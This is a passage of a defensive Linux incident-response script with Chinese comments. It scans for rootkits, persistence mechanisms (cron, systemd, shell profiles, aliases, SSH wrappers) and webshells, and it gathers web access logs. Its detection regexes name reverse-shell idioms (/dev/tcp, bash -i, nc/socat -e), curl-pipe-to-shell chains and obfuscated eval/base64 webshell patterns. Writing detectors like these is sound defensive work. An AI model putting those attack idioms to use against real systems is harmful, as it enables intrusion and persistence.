            "NET-PROMISCUOUS-MODE" "promiscuous-interface" "module-network.log" "SECURITY_ANOMALY" "LOW" \
            '混杂模式常见于抓包、虚拟化、容器网络和 IDS，单独不证明凭据嗅探' \
            '若由陌生进程新启用并伴随抓包文件、异常外连或凭据访问，应升级处置'
    fi

    # ---- 原始数据 ----
    record_raw_status 'ss_listen.txt' "$([ -s "$SOCKET_LISTEN_FILE" ] && printf SUCCESS || printf NO_RESULTS)" network ''
    record_raw_status 'ss_established.txt' "$([ -s "$SOCKET_ESTABLISHED_FILE" ] && printf SUCCESS || printf NO_RESULTS)" network ''
    dump_raw "iptables_rules.txt" iptables -L -n -v
    dump_raw "arp_table.txt" arp -a

    log_info "网络连接检查完成"
}

#==============================================================================
# 05 — 内核模块与 Rootkit
#==============================================================================

check_rootkit() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [05/12] 内核模块与 Rootkit 检测${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # lsmod vs /proc/modules 交叉验证
    local lsmod_count=0
    local proc_mod_count=$(awk 'END {print NR+0}' /proc/modules 2>/dev/null)
    local hidden_modules=""
    if command -v lsmod >/dev/null 2>&1; then
        local lsmod_names=$(lsmod 2>/dev/null | awk 'NR>1 {print $1}' | sort)
        local proc_mod_names=$(awk '{print $1}' /proc/modules 2>/dev/null | sort)
        lsmod_count=$(printf '%s\n' "$lsmod_names" | grep -c . 2>/dev/null || true)
        hidden_modules=$(comm -23 <(printf '%s\n' "$proc_mod_names") <(printf '%s\n' "$lsmod_names") | head -10)
        if [ -n "$hidden_modules" ]; then
            sleep 0.1
            lsmod_names=$(lsmod 2>/dev/null | awk 'NR>1 {print $1}' | sort)
            proc_mod_names=$(awk '{print $1}' /proc/modules 2>/dev/null | sort)
            lsmod_count=$(printf '%s\n' "$lsmod_names" | grep -c . 2>/dev/null || true)
            proc_mod_count=$(printf '%s\n' "$proc_mod_names" | grep -c . 2>/dev/null || true)
            hidden_modules=$(comm -23 <(printf '%s\n' "$proc_mod_names") <(printf '%s\n' "$lsmod_names") | head -10)
        fi
    fi
    if command -v lsmod >/dev/null 2>&1 && [ -n "$hidden_modules" ]; then
        emit_find "CRITICAL" "内核模块数不一致 — 可能存在隐藏 LKM Rootkit" \
            "lsmod: ${lsmod_count} / /proc/modules: ${proc_mod_count} / 模块: ${hidden_modules}" \
            "使用 unhide、Tracee eBPF 或芯片级检测工具进一步检查"
        record_find "CRITICAL" "rootkit" "隐藏内核模块" "lsmod=${lsmod_count} proc=${proc_mod_count}: ${hidden_modules}" "深度 LKM rootkit 排查" "T1014"
    elif command -v lsmod >/dev/null 2>&1; then
        log_info "内核模块数一致 (lsmod: ${lsmod_count})"
    else
        log_warn "lsmod 不可用，跳过内核模块数量交叉验证"
    fi

    # 列出非标准内核模块
    echo -e "\n  ${BOLD}已加载内核模块 (非 kernel 路径):${NC}"
    lsmod 2>/dev/null | awk 'NR>1 {print $1, $4}' | grep -v '^Module' | head -30 | while read line; do echo "    $line"; done

    # LD_PRELOAD 配置：按库路径、存在性、写权限、属主和包归属分级。
    # 非空配置只是机制证据，不再直接等同于 Rootkit。
    echo -e "\n  ${BOLD}LD_PRELOAD 配置检查:${NC}"
    for f in /etc/ld.so.preload /etc/ld.preload; do
        if [ -s "$f" ]; then
            local content preload_lib preload_mode preload_owner preload_package preload_sha
            local preload_sev preload_type preload_confidence preload_reason preload_rule parsed=false
            content=$(safe_read "$f")
            while IFS= read -r preload_lib; do
                [ -n "$preload_lib" ] || continue
                parsed=true; preload_mode=""; preload_owner=""; preload_package=""; preload_sha=""
                preload_sev="MEDIUM"; preload_type="SECURITY_ANOMALY"; preload_confidence="MEDIUM"
                preload_reason="非标准或无包归属的全局预加载库"; preload_rule="INT-LD-PRELOAD-UNOWNED"
                if [ ! -e "$preload_lib" ]; then
                    preload_sev="HIGH"; preload_confidence="MEDIUM"
                    preload_reason="全局预加载库不存在或路径无法解析"; preload_rule="INT-LD-PRELOAD-MISSING"
                else
                    preload_mode=$(stat -c '%a' -- "$preload_lib" 2>/dev/null || true)
                    preload_owner=$(stat -c '%U:%G' -- "$preload_lib" 2>/dev/null || true)
                    preload_sha=$(sha256_file "$preload_lib" 2>/dev/null || true)
                    case "$PKG_MGR" in
                        rpm) preload_package=$(rpm -qf -- "$preload_lib" 2>/dev/null | head -1) ;;
                        dpkg) preload_package=$(file_package_owner "$preload_lib") ;;
                    esac
                    if [[ "$preload_lib" =~ ^/(tmp|var/tmp|dev/shm|home|root)/ ]]; then
                        preload_sev="CRITICAL"; preload_type="SECURITY_THREAT"; preload_confidence="HIGH"
                        preload_reason="全局预加载库位于临时目录或用户目录"; preload_rule="INT-LD-PRELOAD-UNSAFE-PATH"
                    elif [[ "$preload_mode" =~ [2367][0-9]$ || "$preload_mode" =~ [0-9][2367]$ ]]; then
                        preload_sev="HIGH"; preload_type="SECURITY_THREAT"; preload_confidence="HIGH"
                        preload_reason="全局预加载库可被组或其他用户写入"; preload_rule="INT-LD-PRELOAD-WRITABLE"
                    elif [ -n "$preload_package" ] && [[ "$preload_lib" =~ ^/(lib|lib64|usr/lib|usr/lib64)/ ]]; then
                        preload_sev="OBSERVE"; preload_confidence="LOW"
                        preload_reason="标准库路径且存在软件包归属，保留为机制观察"; preload_rule="INT-LD-PRELOAD-PACKAGED"
                    elif [ "$preload_owner" = "root:root" ] && [[ "$preload_mode" =~ ^[0-7][045][045]$ ]]; then
                        preload_sev="OBSERVE"; preload_confidence="LOW"
                        preload_reason="库由 root 持有且组/其他用户不可写，需确认第三方软件来源"; preload_rule="INT-LD-PRELOAD-PROTECTED"
                    fi
                fi
                local preload_detail="config=${f}; lib=${preload_lib}; owner=${preload_owner:-unknown}; mode=${preload_mode:-unknown}; package=${preload_package:-unowned}; sha256=${preload_sha:-unknown}; assessment=${preload_reason}"
                emit_find "$preload_sev" "全局 LD_PRELOAD 配置: ${preload_lib}" "$preload_detail" \
                    "核实库来源、权限、哈希、包归属及实际加载进程"
                record_find "$preload_sev" "rootkit" "全局 LD_PRELOAD: ${preload_lib}" "$preload_detail" \
                    "核实预加载库及配置写入来源" "T1574.006" "$preload_rule" "$preload_lib" \
                    "ld_preload_config.txt,module-rootkit.log,proc/" "$preload_type" "$preload_confidence" "$preload_reason" \
                    '若库位于危险路径、可被非 root 修改、命中恶意哈希或关联异常进程与外连，应升级处置'
                [ "$preload_type" != "SECURITY_THREAT" ] || add_ioc "LD_PRELOAD" "$preload_lib" "$preload_reason"
            done < <(printf '%s\n' "$content" | sed 's/[[:space:]]*#.*$//' | tr ':\t ' '\n' | grep '^/' | sort -u)
            if [ "$parsed" = false ]; then
                record_find "HIGH" "rootkit" "全局 LD_PRELOAD 配置无法解析" "$f: $content" \
                    "人工检查配置格式和库来源" "T1574.006" "INT-LD-PRELOAD-UNRESOLVED" "$f" \
                    "ld_preload_config.txt,module-rootkit.log" "SECURITY_ANOMALY" "MEDIUM"
            fi
        fi
    done
    [ ! -s /etc/ld.so.preload ] && [ ! -s /etc/ld.preload ] && log_info "LD_PRELOAD 未配置"

    # 用 readelf 静态读取依赖，避免 ldd 在部分环境中执行被检查的恶意二进制。
    echo -e "\n  ${BOLD}关键系统命令 ELF 依赖检查:${NC}"
    for bin in /bin/ls /bin/ps /bin/netstat /usr/bin/top /usr/sbin/sshd; do
        if [ -x "$bin" ] && command -v readelf >/dev/null 2>&1; then
            local suspicious_lib=$(readelf -l -d "$bin" 2>/dev/null | grep -E 'Requesting program interpreter|NEEDED' | grep -E '/tmp|/dev/shm|/var/tmp|/home|/root' | head -3)
            if [ -n "$suspicious_lib" ]; then
                emit_find "CRITICAL" "$bin 链接了异常共享库" \
                    "$suspicious_lib" \
                    "系统命令被 hook，可能已被 rootkit 替换"
                record_find "CRITICAL" "rootkit" "命令 hook: $bin" "$suspicious_lib" "从干净系统恢复" "T1574.006"
                add_ioc "File" "$bin -> $(echo $suspicious_lib)" "被 hook 的系统命令"
            fi
        fi
    done

    # PAM 后门检测
    echo -e "\n  ${BOLD}PAM 配置检查:${NC}"
    safe_read /etc/pam.d/sshd | grep -v '^#' | grep -v '^$' | head -20 | while read line; do echo "    $line"; done

    # 不再用 strings 命中普通字符串来判定 PAM 后门：正常 pam_unix.so 会包含大量这类字符串，
    # 该规则在实际主机上几乎必然产生 CRITICAL 误报。PAM 配置和包完整性由其他检查负责。
    log_info "跳过 PAM 二进制普通字符串启发式，避免误报"

    # 仅 full profile 执行全包完整性校验；高频 profile 依靠文件增量和进程包归属。
    echo -e "\n  ${BOLD}系统文件完整性:${NC}"
    if [ "$PROFILE_PACKAGE_INTEGRITY" != true ]; then
        log_info "${SCAN_PROFILE} 跳过 rpm -Va / debsums"
        record_raw_status 'package-integrity.txt' NOT_APPLICABLE rootkit "profile=${SCAN_PROFILE}"
    else case "${PKG_MGR}" in
        rpm)
            # rpm -Va 本身只输出差异；配置文件经常被正常修改，只提升可执行文件和库的差异。
            local changed=$(rpm -Va 2>/dev/null | awk '$NF ~ /^\/(bin|sbin|usr\/bin|usr\/sbin|lib|lib64)\// {print}' | head -30)
            if [ -n "$changed" ]; then
                echo "$changed" | while read line; do echo "    $line"; done
                emit_find "HIGH" "系统 RPM 文件完整性校验失败 — 可能存在被替换的系统文件" \
                    "$(echo "$changed" | head -5 | tr '\n' ' ')" \
                    "被替换的系统文件可能被 rootkit 植入，需从干净系统恢复"
                record_find "HIGH" "rootkit" "系统文件被篡改" "$(echo "$changed" | head -5)" "从干净系统恢复" "T1565"
            else
                log_info "RPM 文件完整性通过"
            fi
            ;;
        dpkg)
            if command -v debsums &>/dev/null; then
                local changed=$(debsums -s 2>/dev/null | head -20)
                if [ -n "$changed" ]; then
                    echo "$changed" | while read line; do echo "    $line"; done
                    record_find "HIGH" "rootkit" "Deb 文件被篡改" "$(echo "$changed" | head -5)" "从干净系统恢复" "T1565"
                else
                    log_info "debsums 完整性通过"
                fi
            else
                log_info "debsums 未安装，跳过完整性检查"
            fi
            ;;
    esac
    fi

    # ---- 原始数据 ----
    dump_raw "lsmod.txt" lsmod
    dump_raw "proc_modules.txt" cat /proc/modules
    [ -s /etc/ld.so.preload ] && dump_raw "ld_preload_config.txt" cat /etc/ld.so.preload
    dump_raw "kernel_tainted.txt" cat /proc/sys/kernel/tainted

    collect_ebpf_kernel_inventory
    log_info "Rootkit 检测完成（用户态结果不能完全排除内核 Rootkit）"
}

#==============================================================================
# 06 — 持久化机制
#==============================================================================

check_persistence() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [06/12] 持久化机制${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 1. 所有 Crontab 收集
    echo -e "\n  ${BOLD}[1] Crontab 计划任务:${NC}"
    for user in $(awk -F: '($3>=0){print $1}' /etc/passwd 2>/dev/null); do
        local ct=$(crontab -u "$user" -l 2>/dev/null | grep -v '^#' | grep -v '^$')
        if [ -n "$ct" ]; then
            echo -e "    ${CYAN}用户: $user${NC}"
            while IFS= read -r line; do
                echo "      $line"
                # 单纯执行 .sh、curl 或 wget 在运维任务中很常见；只对组合型行为告警。
                if echo "$line" | grep -qE '/dev/(tcp|udp)/|bash[[:space:]]+-i|(^|[;&[:space:]])(nc|ncat|netcat|socat)[[:space:]].*(-e|exec:)'; then
                    emit_find "CRITICAL" "Crontab 包含反弹 Shell 持久化 (用户: $user)" "$line" \
                        "立即保全任务、脚本和网络证据并停用未经授权的计划任务"
                    record_find "CRITICAL" "persistence" "Cron 反弹 Shell 持久化" "$user: $line" "立即处置" "T1053.003" \
                        "PER-CRON-REVERSE-SHELL" "$user:$line" "crontab_all.txt,module-persistence.log" "SECURITY_THREAT" "HIGH"
                    add_ioc "Cron" "$user: $line" "反弹 Shell 持久化"
                elif echo "$line" | grep -qE '(curl|wget).*(\|[[:space:]]*(sh|bash)|&&[[:space:]]*(chmod|sh|bash)|/(tmp|var/tmp|dev/shm)/)|base64.*(-d|--decode).*(\||[[:space:]](sh|bash)|eval)'; then
                    emit_find "HIGH" "Crontab 包含下载执行组合 (用户: $user)" "$line" \
                        "核实任务来源、下载目标、落地文件和执行结果"
                    record_find "HIGH" "persistence" "Cron 下载执行组合" "$user: $line" "核实并按需移除" "T1053.003" \
                        "PER-CRON-DOWNLOAD-EXEC" "$user:$line" "crontab_all.txt,module-persistence.log" "SECURITY_ANOMALY" "MEDIUM" \
                        '计划任务包含下载后执行组合，具有较高风险，但仍可能是授权更新任务' \
                        '若目标未知、文件无可信归属、关联异常外连或以 root 执行，应升级为安全威胁'
                fi
            done <<< "$ct"
        fi
    done

    # 系统级 cron
    for cron_dir in /etc/crontab /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
        if [ -d "$cron_dir" ]; then
            echo -e "    ${DIM}${cron_dir}:${NC}"
            ls -la "$cron_dir" 2>/dev/null | grep -v '^total\|^d' | head -10 | while read line; do echo "      $line"; done
        elif [ -f "$cron_dir" ]; then
            echo -e "    ${DIM}${cron_dir}:${NC}"
            safe_read "$cron_dir" | grep -v '^#' | grep -v '^$' | head -10 | while read line; do echo "      $line"; done
        fi
    done

    # 2. systemd 服务
    echo -e "\n  ${BOLD}[2] Systemd 可疑服务 (非系统路径):${NC}"
    local susp_services=$(systemctl list-unit-files --type=service 2>/dev/null | grep -v '/usr/lib\|/lib/systemd' | grep enabled | head -20)
    if [ -n "$susp_services" ]; then
        echo "$susp_services" | while read line; do echo "    $line"; done
    else
        log_info "systemd 服务检查通过"
    fi

    # 路径异常的 systemd 服务
    for svc_dir in /etc/systemd/system /usr/local/lib/systemd/system ~/.config/systemd/user; do
        if [ -d "$svc_dir" ]; then
            local weird_svc=$(grep -rHnE 'ExecStart=.*/(tmp|dev/shm|var/tmp|home/[^/]+/download)' "$svc_dir" 2>/dev/null | head -20)
            if [ -n "$weird_svc" ]; then
                emit_find "HIGH" "发现路径异常的 systemd 服务" \
                    "$weird_svc" \
                    "服务二进制在临时目录或下载目录"
                record_find "HIGH" "persistence" "Systemd 服务从危险路径启动" "$weird_svc" "检查并按需禁用" "T1543.002" \
                    "PER-SYSTEMD-UNSAFE-EXEC" "systemd-unsafe-exec" "systemd_services.txt,file-changes.tsv,module-persistence.log" \
                    "SECURITY_ANOMALY" "MEDIUM" 'Systemd 从临时或下载目录启动程序具有较高持久化风险，但仍需确认服务来源和实际运行状态' \
                    '若服务已启用运行、文件无可信归属、存在异常外连或恶意哈希，应升级为安全威胁'
            fi
        fi
    done

    # 3. rc.local / init 脚本
    echo -e "\n  ${BOLD}[3] rc.local / init 脚本:${NC}"
    for f in /etc/rc.local /etc/init.d/* /etc/rc.d/rc.local; do
        if [ -f "$f" ] && [ -x "$f" ]; then
            echo -e "    ${DIM}$f:${NC}"
            safe_read "$f" | grep -v '^#' | grep -v '^$' | head -5 | while read line; do echo "      $line"; done
        fi
    done

    # 4. Shell Profile 注入
    echo -e "\n  ${BOLD}[4] Shell Profile 注入检查:${NC}"
    for pf in /etc/profile /etc/bashrc /etc/bash.bashrc /etc/environment; do
        if [ -f "$pf" ]; then
            local injected=$(profile_suspicious_lines "$pf" | head -5)
            if [ -n "$injected" ]; then
                emit_find "HIGH" "系统 Profile 可能被注入: $pf" \
                    "$injected" \
                    "核实命令来源、目标地址和写入时间；确认未授权后再移除"
                record_find "HIGH" "persistence" "Profile 注入: $pf" "$injected" \
                    "核实后移除未授权注入" "T1546.004" "PER-SYSTEM-PROFILE-INJECTION" "$pf" "module-persistence.log,file-changes.tsv" \
                    "SECURITY_ANOMALY" "HIGH" '全局 Profile 包含下载执行、反向连接、危险环境注入或命令劫持组合，但尚未确认未经授权' \
                    '若文件为基线新增/修改、由异常进程写入或已触发执行与外连，应升级为安全威胁'
            fi
        fi
    done

    # 用户级 Profile
    for home_dir in /root /home/*; do
        for pf in .bashrc .bash_profile .profile .zshrc .zprofile; do
            local upf="${home_dir}/${pf}"
            if [ -f "$upf" ]; then
                local injected=$(profile_suspicious_lines "$upf" | head -3)
                if [ -n "$injected" ]; then
                    local user=$(basename "$home_dir")
                    emit_find "HIGH" "用户 Profile 可能被注入: $upf" \
                        "$injected" \
                        "核实用户 $user 的命令来源和文件修改时间"
                    record_find "HIGH" "persistence" "用户 Profile 注入" "$upf: $injected" \
                        "核实后移除未授权注入" "T1546.004" "PER-USER-PROFILE-INJECTION" "$upf" "module-persistence.log,file-changes.tsv" \
                        "SECURITY_ANOMALY" "MEDIUM" '用户 Profile 包含下载执行、反向连接、危险环境注入或命令劫持组合，但可能来自授权配置或测试' \
                        '若文件近期由异常进程写入、对应账号出现陌生登录或命令已执行外连，应升级处置'
                fi
            fi
        done
    done

    # 5. Alias 后门
    echo -e "\n  ${BOLD}[5] Alias 后门检查:${NC}"
    local weird_alias=$(alias 2>/dev/null | \
        grep -E "alias (ls|ps|netstat|ssh|sudo|passwd)=" | \
        grep -E '(curl|wget|nc |ncat|netcat|socat|/tmp/|/var/tmp/|/dev/shm/|/dev/tcp/|\$\(|`|\||;)' | head -10)
    if [ -n "$weird_alias" ]; then
        emit_find "HIGH" "发现可疑命令别名（可能劫持常用命令）" \
            "$weird_alias" \
            "检查 ~/.bashrc 和 /etc/bashrc 中的 alias 定义"
        record_find "HIGH" "persistence" "高风险命令 Alias" "$weird_alias" "核实后移除异常 alias" "T1546.004" \
            "PER-ALIAS-HIJACK" "active-dangerous-alias" "module-persistence.log" "SECURITY_ANOMALY" "MEDIUM" \
            'Alias 劫持了常用管理命令并包含下载、解释器、临时路径或命令拼接特征' \
            '若配置近期被陌生进程写入，或已导致凭据泄露、执行与外连，应升级为安全威胁'
    else
        log_info "Alias 检查通过"
    fi

    # 6. SSH Wrapper 后门
    echo -e "\n  ${BOLD}[6] SSH Wrapper 后门:${NC}"
    for ssh_bin in /usr/bin/ssh /usr/sbin/sshd /usr/bin/scp; do
        if [ -f "$ssh_bin" ]; then
            local ftype=$(file "$ssh_bin" 2>/dev/null)
            if ! echo "$ftype" | grep -q 'ELF'; then
                emit_find "HIGH" "$ssh_bin 不是 ELF 可执行文件 — 可能是 Wrapper 脚本后门" \
                    "$ftype" \
                    "SSH 二进制被替换为脚本，检查内容并恢复"
                record_find "HIGH" "backdoor" "SSH Wrapper" "$ssh_bin: $ftype" "核对包完整性和包装脚本来源" "T1556" \
                    "AUTH-SSH-WRAPPER" "$ssh_bin" "module-persistence.log,recent_packages.txt" "SECURITY_ANOMALY" "MEDIUM" \
                    'SSH/SSHD/SCP 主程序不是 ELF，可能是合法包装脚本，也可能用于凭证截获或命令劫持' \
                    '若软件包校验失败、脚本近期新增或转发凭据/命令至异常目标，应升级为安全威胁'
            fi
        fi
    done
    log_info "SSH Wrapper 检查完成"

    # 7. 内核模块自动加载
    echo -e "\n  ${BOLD}[7] 内核模块自动加载配置:${NC}"
    for f in /etc/modules-load.d/*.conf /etc/modules /etc/modprobe.d/*.conf; do
        if [ -f "$f" ]; then
            local content=$(safe_read "$f" | grep -v '^#' | grep -v '^$')
            if [ -n "$content" ]; then
                echo -e "    ${DIM}$f:${NC}"
                echo "$content" | while read line; do echo "      $line"; done
            fi
        fi
    done

    # ---- 原始数据: 全量 crontab ----
    {
        echo "=== /etc/crontab ===" && cat /etc/crontab 2>/dev/null
        for d in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
            [ -d "$d" ] && echo "=== $d ===" && ls -la "$d" 2>/dev/null
        done
        for u in $(awk -F: '($3>=0){print $1}' /etc/passwd 2>/dev/null); do
            ct=$(crontab -u "$u" -l 2>/dev/null)
            [ -n "$ct" ] && echo "=== user: $u ===" && echo "$ct"
        done
    } | dump_raw "crontab_all.txt"
    dump_raw "systemd_services.txt" systemctl list-unit-files --type=service

    log_info "持久化机制检查完成"
}

#==============================================================================
# Web 恶意文件结构分析与 HTTP 行为关联
#==============================================================================

web_real_type_mismatch() {
    local path="$1" mime desc ext
    ext="${path##*.}"
    if [ "${BASH_VERSINFO[0]:-0}" -ge 4 ]; then ext="${ext,,}"; else ext=$(printf '%s' "$ext" | tr '[:upper:]' '[:lower:]'); fi
    mime=$(file -b --mime-type -- "$path" 2>/dev/null); desc=$(file -b -- "$path" 2>/dev/null)
    case "$ext:$mime:$desc" in
        jpg:*script*:*|jpeg:*script*:*|png:*script*:*|gif:*script*:*|css:*script*:*|js:*php*:*|txt:*executable*:*|conf:*executable*:*) return 0 ;;
    esac
    case "$ext" in
        jpg|jpeg|png|gif|ico)
            LC_ALL=C head -c 4096 "$path" 2>/dev/null | grep -Eaq '<\?php|<%[@=]?|<jsp:|Runtime[.]getRuntime|ProcessBuilder' && return 0
            ;;
    esac
    return 1
}

file_entropy_estimate() {
    local path="$1"
    LC_ALL=C od -An -tu1 -N 65536 -- "$path" 2>/dev/null | awk '
        {for(i=1;i<=NF;i++){c[$i]++;n++}}
        END {if(!n){print "0.00";exit} for(i in c){p=c[i]/n; h-=p*log(p)/log(2)} printf "%.2f",h}'
}

web_static_structure_score() {
    local path="$1" score=0 reasons="" entropy long_line=0 structural=0
    [ -f "$path" ] || { printf '0\tmissing\t0\t0'; return; }
    if LC_ALL=C grep -Eaq '(base64_decode|atob|FromBase64String).*(gzinflate|gzuncompress|str_rot13|xor|pack)|((gzinflate|gzuncompress|str_rot13|xor|pack).*(base64_decode|atob|FromBase64String))' "$path" 2>/dev/null; then
        score=$((score + 3)); structural=$((structural + 1)); reasons="${reasons}多层解码/变换;"
    fi
    if LC_ALL=C grep -Eaq '(\$[A-Za-z_][A-Za-z0-9_]*[[:space:]]*=[^;]*[.][^;]*;.{0,240}\$[A-Za-z_][A-Za-z0-9_]*[[:space:]]*\()|(call_user_func(_array)?|Reflection(Function|Method)|getattr|globals\(\)|__import__|Class[.]forName|Method[.]invoke)' "$path" 2>/dev/null; then
        score=$((score + 3)); structural=$((structural + 1)); reasons="${reasons}动态函数构造/反射;"
    fi
    if LC_ALL=C grep -Eaq '(eval|assert|exec|system|shell_exec|passthru|Runtime[.]getRuntime|ProcessBuilder)[[:space:]]*\([^\n]*(base64|gzinflate|gzuncompress|str_rot13|pack|chr|fromCharCode|decode)|((base64|gzinflate|gzuncompress|str_rot13|pack|chr|fromCharCode|decode)[^\n]{0,240}(eval|assert|exec|system|shell_exec|passthru))' "$path" 2>/dev/null; then
        score=$((score + 4)); structural=$((structural + 1)); reasons="${reasons}解码后执行;"
    fi
    if web_real_type_mismatch "$path"; then score=$((score + 3)); structural=$((structural + 1)); reasons="${reasons}真实类型与扩展不一致;"; fi
    entropy=$(file_entropy_estimate "$path");
    awk -v h="$entropy" 'BEGIN{exit !(h>=7.20)}' && { score=$((score + 1)); reasons="${reasons}高熵辅助;"; }
    LC_ALL=C awk 'length($0)>4000 {found=1;exit} END{exit !found}' "$path" 2>/dev/null && { long_line=1; score=$((score + 1)); reasons="${reasons}超长单行辅助;"; }
    # 没有结构信号时，高熵和长行不能单独构成可疑静态结果。
    [ "$structural" -gt 0 ] || score=0
    printf '%s\t%s\t%s\t%s' "$score" "${reasons%;}" "$entropy" "$long_line"
}

collect_web_access_logs() {
    local out="${RAW_DIR}/web-access-recent.log" normalized="${RAW_DIR}/web-access-normalized.tsv"
    local staging="${OUTPUT_DIR}/.web-access-input.${RUN_ID}" sample="${OUTPUT_DIR}/.web-access-sample.${RUN_ID}"
    local pattern log line remaining sample_count parse_rc=0
    local -a patterns=() configured_patterns=()
    declare -A seen_logs=()
    : > "$out"; : > "$staging"
    WEB_ACCESS_LOG_FILES=0; WEB_ACCESS_LOG_LINES=0; WEB_ACCESS_LOG_PARSED=0; WEB_ACCESS_LOG_FAILED=0
    if ! [[ "$WEB_ACCESS_LOG_MAX_LINES" =~ ^[0-9]+$ ]] || [ "$WEB_ACCESS_LOG_MAX_LINES" -lt 1 ] || [ "$WEB_ACCESS_LOG_MAX_LINES" -gt 200000 ]; then
        WEB_ACCESS_LOG_MAX_LINES=5000
        mark_current_module_partial web_access_log_max_lines_invalid
    fi
    case "$WEB_ACCESS_LOG_FORMAT" in
        auto|nginx_combined|apache_combined|json|tomcat) ;;
        *) WEB_ACCESS_LOG_FORMAT=auto; mark_current_module_partial web_access_log_format_invalid ;;
    esac
    if [ -n "$WEB_ACCESS_LOG_PATHS" ]; then
        IFS=',' read -r -a configured_patterns <<< "$WEB_ACCESS_LOG_PATHS"
        patterns+=("${configured_patterns[@]}")
    fi
    patterns+=(
        '/var/log/nginx/access.log*' '/var/log/nginx/*access*.log*'
        '/var/log/httpd/access_log*' '/var/log/apache2/access.log*'
        '/usr/local/nginx/logs/access.log*' '/var/log/openresty/access.log*'
        '/var/log/caddy/access.log*' '/var/log/tomcat*/localhost_access_log*.txt'
        '/opt/tomcat/logs/localhost_access_log*.txt'
    )
    for pattern in "${patterns[@]}"; do
        pattern=$(printf '%s' "$pattern" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [ -n "$pattern" ] || continue
        while IFS= read -r log; do
            [ -r "$log" ] || continue
            [ -z "${seen_logs[$log]:-}" ] || continue
            seen_logs["$log"]=1
            remaining=$((WEB_ACCESS_LOG_MAX_LINES - WEB_ACCESS_LOG_LINES))
            [ "$remaining" -gt 0 ] || break 2
            : > "$sample"
            case "$log" in
                *.gz) command -v gzip >/dev/null 2>&1 && gzip -cd -- "$log" 2>/dev/null | tail -n "$remaining" > "$sample" ;;
                *.xz) command -v xzcat >/dev/null 2>&1 && xzcat -- "$log" 2>/dev/null | tail -n "$remaining" > "$sample" ;;
                *) tail -n "$remaining" -- "$log" 2>/dev/null > "$sample" ;;
            esac
            sample_count=$(awk 'END{print NR+0}' "$sample" 2>/dev/null); sample_count=${sample_count:-0}
            [ "$sample_count" -gt 0 ] || continue
            WEB_ACCESS_LOG_FILES=$((WEB_ACCESS_LOG_FILES + 1))
            printf '=== %s ===\n' "$log" >> "$out"
            cat "$sample" >> "$out"
            while IFS= read -r line || [ -n "$line" ]; do
                printf '%s\t%s\n' "$log" "$line" >> "$staging"
            done < "$sample"
            WEB_ACCESS_LOG_LINES=$((WEB_ACCESS_LOG_LINES + sample_count))
        done < <(compgen -G "$pattern" 2>/dev/null | LC_ALL=C sort -u || true)
    done
    rm -f "$sample"
    if [ "$WEB_ACCESS_LOG_LINES" -eq 0 ]; then
        printf 'timestamp\tsource_file\tremote_ip\tmethod\turi\tstatus\tbytes\thost\tuser_agent\treferer\tparse_status\traw_line_hash\n' > "$normalized"
        WEB_ACCESS_LOG_STATUS="MISSING"
        record_raw_status 'web-access-recent.log' NO_RESULTS web 'no_readable_access_log'
        record_raw_status 'web-access-normalized.tsv' NO_RESULTS web 'no_readable_access_log'
        rm -f "$staging"
        return 0
    fi
    if [ -x "$NATIVE_SCANNER_PATH" ]; then
        run_with_timeout 30 "$NATIVE_SCANNER_PATH" parse-web-access --input "$staging" --output "$normalized" --format "$WEB_ACCESS_LOG_FORMAT" || parse_rc=$?
    else
        parse_rc=125
    fi
    if [ "$parse_rc" -ne 0 ]; then
        printf 'timestamp\tsource_file\tremote_ip\tmethod\turi\tstatus\tbytes\thost\tuser_agent\treferer\tparse_status\traw_line_hash\n' > "$normalized"
        while IFS=$'\t' read -r log line; do
            printf '\t%s\t\t\t\t\t\t\t\t\tPARTIAL_PARSE\t%s\n' "$log" "$(sha256_text "$line")" >> "$normalized"
        done < "$staging"
        mark_current_module_partial web_access_parser_unavailable
    fi
    WEB_ACCESS_LOG_PARSED=$(awk -F '\t' 'NR>1 && $11=="FULL_PARSE"{n++} END{print n+0}' "$normalized")
    WEB_ACCESS_LOG_FAILED=$(awk -F '\t' 'NR>1 && $11!="FULL_PARSE"{n++} END{print n+0}' "$normalized")
    if [ "$WEB_ACCESS_LOG_FAILED" -gt 0 ]; then
        WEB_ACCESS_LOG_STATUS="PARTIAL"
        mark_current_module_partial "web_access_partial_parse=${WEB_ACCESS_LOG_FAILED}"
    else
        WEB_ACCESS_LOG_STATUS="AVAILABLE"
    fi
    chmod 600 "$out" "$normalized" 2>/dev/null || true
    record_raw_status 'web-access-recent.log' SUCCESS web ''
    record_raw_status 'web-access-normalized.tsv' "$([ "$WEB_ACCESS_LOG_FAILED" -gt 0 ] && printf PARTIAL || printf SUCCESS)" web "$([ "$WEB_ACCESS_LOG_FAILED" -gt 0 ] && printf 'partial_parse=%s' "$WEB_ACCESS_LOG_FAILED" || true)"
    rm -f "$staging"
}

run_with_timeout() {
    local seconds="$1"; shift
    if command -v timeout >/dev/null 2>&1; then
        timeout --signal=TERM --kill-after=2 "${seconds}s" "$@"
    elif command -v gtimeout >/dev/null 2>&1; then
        gtimeout --signal=TERM --kill-after=2 "${seconds}s" "$@"
    else
        # Supported Linux targets ship coreutils timeout.  Do not launch an
        # unbounded parser when a minimal installation removed it.
        return 125
    fi
}

static_pipeline_stage_budget() {
    local stages_left="${1:-1}" remaining
    STATIC_STAGE_TIMEOUT="$YARA_TOTAL_TIMEOUT"
    [ "$STATIC_PIPELINE_DEADLINE" -gt 0 ] || return 0
    remaining=$((STATIC_PIPELINE_DEADLINE - SECONDS))
    if [ "$remaining" -le 0 ]; then
        STATIC_STAGE_TIMEOUT=0
        return 1
    fi
